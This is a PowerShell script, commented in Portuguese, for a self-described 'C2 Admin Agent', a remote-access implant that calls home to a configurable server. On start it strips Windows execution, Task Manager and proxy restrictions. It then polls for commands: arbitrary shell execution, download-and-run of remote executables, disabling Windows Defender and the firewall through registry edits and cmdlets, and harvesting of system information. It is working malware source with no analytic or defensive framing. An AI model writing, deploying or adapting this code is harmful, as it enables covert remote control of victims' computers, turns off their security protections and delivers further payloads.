# C2 Admin Agent - PowerShell Version
# Funciona em TODOS os Windows 10/11 sem precisar instalar Python!

# Configurações (serão substituídas pelo servidor)
$SERVER_URL = "SERVER_URL_PLACEHOLDER"
$SECRET_TOKEN = "SECRET_TOKEN_PLACEHOLDER"

# Classe do Agente
class AdminAgent {
    [string]$ClientId
    [string]$Hostname
    [string]$Username
    [string]$OSVersion
    [string]$ServerUrl
    [string]$Token
    [int]$CheckinInterval

    AdminAgent([string]$serverUrl, [string]$token) {
        $this.ServerUrl = $serverUrl
        $this.Token = $token
        $this.CheckinInterval = 30
        $this.ClientId = $this.GenerateClientId()
        $this.Hostname = $env:COMPUTERNAME
        $this.Username = $env:USERNAME
        $this.OSVersion = $this.GetOSVersion()

        # EXECUTAR AUTOMATICAMENTE ao conectar
        $this.AutoRemoveRestrictions()
    }
    
    [string] GenerateClientId() {
        # Gerar ID único baseado no hardware
        try {
            $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
            $md5 = [System.Security.Cryptography.MD5]::Create()
            $hash = $md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($uuid))
            return [System.BitConverter]::ToString($hash).Replace("-", "").ToLower()
        } catch {
            # Fallback: usar hostname
            $md5 = [System.Security.Cryptography.MD5]::Create()
            $hash = $md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME))
            return [System.BitConverter]::ToString($hash).Replace("-", "").ToLower()
        }
    }
    
    [string] GetOSVersion() {
        try {
            $os = Get-WmiObject -Class Win32_OperatingSystem
            return "$($os.Caption) $($os.Version)"
        } catch {
            return "Windows Unknown"
        }
    }
    
    [object] SendRequest([string]$endpoint, [hashtable]$data) {
        try {
            $url = "$($this.ServerUrl)$endpoint"

            if ($data) {
                $data['token'] = $this.Token
                $jsonData = $data | ConvertTo-Json -Compress

                $response = Invoke-RestMethod -Uri $url -Method Post `
                    -Body $jsonData -ContentType "application/json" `
                    -TimeoutSec 10 -ErrorAction Stop
            } else {
                $response = Invoke-RestMethod -Uri $url -Method Get `
                    -TimeoutSec 10 -ErrorAction Stop
            }

            return $response
        } catch {
            Write-Host "[!] Erro na requisição: $_"
            return $null
        }
    }
    
    [array] Checkin() {
        $data = @{
            client_id = $this.ClientId
            hostname = $this.Hostname
            username = $this.Username
            os_version = $this.OSVersion
        }

        $response = $this.SendRequest('/api/checkin', $data)

        if ($response -and $response.commands) {
            return @($response.commands)
        }
        return @()
    }
    
    [void] ExecuteCommand([object]$command) {
        $cmdType = $command.type
        $params = $command.params
        $cmdId = $command.id

        $result = ""

        try {
            switch ($cmdType) {
                'shell' {
                    if ($params -and $params.cmd) {
                        $result = $this.RunShell($params.cmd)
                    }
                }
                'remove_restrictions' {
                    $result = $this.RemoveRestrictions()
                }
                'enable_execution' {
                    $result = $this.EnableExecution()
                }
                'remove_proxy' {
                    $result = $this.RemoveProxyRestrictions()
                }
                'get_info' {
                    $result = $this.GetSystemInfo()
                }
                'download_execute' {
                    if ($params -and $params.url) {
                        $result = $this.DownloadAndExecute($params.url)
                    }
                }
                'disable_defender' {
                    $result = $this.DisableWindowsDefender()
                }
                'disable_firewall' {
                    $result = $this.DisableFirewall()
                }
                'disable_all' {
                    $result = $this.DisableAllProtections()
                }
                default {
                    $result = "Comando desconhecido: $cmdType"
                }
            }
        } catch {
            $result = "Erro ao executar: $_"
        }

        $this.SendResult($cmdId, $command, $result)
    }
    
    [void] SendResult([string]$cmdId, [object]$command, [string]$result) {
        $data = @{
            client_id = $this.ClientId
            command_id = $cmdId
            result = $result
        }
        $this.SendRequest('/api/result', $data) | Out-Null
    }

    [string] RunShell([string]$cmd) {
        try {
            $output = Invoke-Expression $cmd 2>&1 | Out-String
            return $output
        } catch {
            return "Erro: $_"
        }
    }

    [string] RemoveRestrictions() {
        $commands = @(
            'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "DisallowRun" /t REG_DWORD /d 0 /f',
            'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /f',
            'reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /f',
            'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /f'
        )

        $results = @()
        foreach ($cmd in $commands) {
            try {
                $output = cmd /c $cmd 2>&1
                $results += "$($cmd.Substring(0, [Math]::Min(50, $cmd.Length)))... -> OK"
            } catch {
                $results += "$($cmd.Substring(0, [Math]::Min(50, $cmd.Length)))... -> Erro: $_"
            }
        }

        return $results -join "`n"
    }

    [string] EnableExecution() {
        $commands = @(
            'reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "DisallowRun" /f',
            'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "RestrictRun" /f'
        )

        $results = @()
        foreach ($cmd in $commands) {
            try {
                $output = cmd /c $cmd 2>&1
                $results += "OK"
            } catch {
                $results += "Erro: $_"
            }
        }

        # Habilitar PowerShell
        try {
            Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
            $results += "PowerShell habilitado"
        } catch {
            $results += "Erro ao habilitar PowerShell: $_"
        }

        return "Execução habilitada:`n" + ($results -join "`n")
    }

    [string] RemoveProxyRestrictions() {
        $commands = @(
            'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "ProxyEnable" /f',
            'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "ProxyServer" /f',
            'reg delete "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v "HomePage" /f',
            'reg delete "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /f'
        )

        $results = @()
        foreach ($cmd in $commands) {
            try {
                $output = cmd /c $cmd 2>&1
                $results += "OK"
            } catch {
                $results += "Erro: $_"
            }
        }

        return "Restrições de navegação removidas:`n" + ($results -join "`n")
    }

    [string] DisableWindowsDefender() {
        $results = @()

        # Desabilitar proteção em tempo real
        try {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            $results += "✓ Proteção em tempo real desativada"
        } catch {
            $results += "✗ Erro ao desativar proteção em tempo real: $_"
        }

        # Desabilitar proteção na nuvem
        try {
            Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
            $results += "✓ Proteção na nuvem desativada"
        } catch {
            $results += "✗ Erro ao desativar proteção na nuvem: $_"
        }

        # Desabilitar envio de amostras
        try {
            Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
            $results += "✓ Envio de amostras desativado"
        } catch {
            $results += "✗ Erro ao desativar envio de amostras: $_"
        }

        # Desabilitar via registro
        $regCommands = @(
            'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
            'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f',
            'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f',
            'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f'
        )

        foreach ($cmd in $regCommands) {
            try {
                cmd /c $cmd 2>&1 | Out-Null
                $results += "✓ Registro modificado"
            } catch {
                $results += "✗ Erro no registro: $_"
            }
        }

        return "Windows Defender desativado:`n" + ($results -join "`n")
    }

    [string] DisableFirewall() {
        $results = @()

        # Desabilitar firewall via netsh
        try {
            cmd /c 'netsh advfirewall set allprofiles state off' 2>&1 | Out-Null
            $results += "✓ Firewall desativado via netsh"
        } catch {
            $results += "✗ Erro ao desativar via netsh: $_"
        }

        # Desabilitar via PowerShell
        try {
            Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue
            $results += "✓ Firewall desativado via PowerShell"
        } catch {
            $results += "✗ Erro ao desativar via PowerShell: $_"
        }

        # Desabilitar via registro
        $regCommands = @(
            'reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f'
        )

        foreach ($cmd in $regCommands) {
            try {
                cmd /c $cmd 2>&1 | Out-Null
                $results += "✓ Registro modificado"
            } catch {
                $results += "✗ Erro no registro: $_"
            }
        }

        return "Firewall desativado:`n" + ($results -join "`n")
    }

    [string] DisableAllProtections() {
        $results = @()
        $results += "=" * 60
        $results += "INICIANDO DESATIVAÇÃO COMPLETA DE PROTEÇÕES"
        $results += "=" * 60

        $results += "`n[1/4] Desativando Windows Defender..."
        $results += $this.DisableWindowsDefender()

        $results += "`n[2/4] Desativando Firewall..."
        $results += $this.DisableFirewall()

        $results += "`n[3/4] Removendo restrições de execução..."
        $results += $this.RemoveRestrictions()

        $results += "`n[4/4] Habilitando execução de programas..."
        $results += $this.EnableExecution()

        $results += "`n" + ("=" * 60)
        $results += "✅ TODAS AS PROTEÇÕES DESATIVADAS COM SUCESSO!"
        $results += "=" * 60

        return $results -join "`n"
    }

    [string] GetSystemInfo() {
        $info = @{
            hostname = $this.Hostname
            username = $this.Username
            os = $this.OSVersion
            architecture = [System.Environment]::Is64BitOperatingSystem
            processor = (Get-WmiObject -Class Win32_Processor).Name
            ram_gb = [Math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
        }

        # Informações de rede
        try {
            $ips = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne '127.0.0.1'}).IPAddress
            $info['ip_addresses'] = $ips -join ', '
        } catch {
            $info['ip_addresses'] = 'N/A'
        }

        # Informações de disco
        try {
            $drives = Get-WmiObject -Class Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3}
            $driveInfo = $drives | ForEach-Object {
                "$($_.DeviceID) - Total: $([Math]::Round($_.Size / 1GB, 2))GB - Livre: $([Math]::Round($_.FreeSpace / 1GB, 2))GB"
            }
            $info['drives'] = $driveInfo -join '; '
        } catch {
            $info['drives'] = 'N/A'
        }

        return $info | ConvertTo-Json -Depth 3
    }

    [string] DownloadAndExecute([string]$url) {
        try {
            $tempFile = Join-Path $env:TEMP "temp_exec.exe"
            Invoke-WebRequest -Uri $url -OutFile $tempFile -TimeoutSec 30
            Start-Process $tempFile
            return "Arquivo baixado e executado: $tempFile"
        } catch {
            return "Erro ao baixar/executar: $_"
        }
    }

    [void] AutoRemoveRestrictions() {
        try {
            Write-Host "[*] Removendo restrições automaticamente..."

            $this.RemoveRestrictions() | Out-Null
            Write-Host "[✓] Restrições de execução removidas"

            $this.EnableExecution() | Out-Null
            Write-Host "[✓] Execução de programas habilitada"

            $this.RemoveProxyRestrictions() | Out-Null
            Write-Host "[✓] Restrições de navegação removidas"

            Write-Host "[✓] Todas as restrições removidas automaticamente!"
        } catch {
            Write-Host "[!] Erro ao remover restrições: $_"
        }
    }

    [void] Run() {
        Write-Host "[*] Agente iniciado - ID: $($this.ClientId)"

        while ($true) {
            try {
                # Fazer checkin
                $commands = $this.Checkin()

                # Executar comandos recebidos
                foreach ($command in $commands) {
                    Write-Host "[*] Executando comando: $($command.type)"
                    $this.ExecuteCommand($command)
                }

                # Aguardar próximo checkin
                Start-Sleep -Seconds $this.CheckinInterval

            } catch {
                Write-Host "[!] Erro: $_"
                Start-Sleep -Seconds $this.CheckinInterval
            }
        }
    }
}

# Executar agente
try {
    $agent = [AdminAgent]::new($SERVER_URL, $SECRET_TOKEN)
    $agent.Run()
} catch {
    Write-Host "[!] Erro fatal: $_"
    Start-Sleep -Seconds 5
}

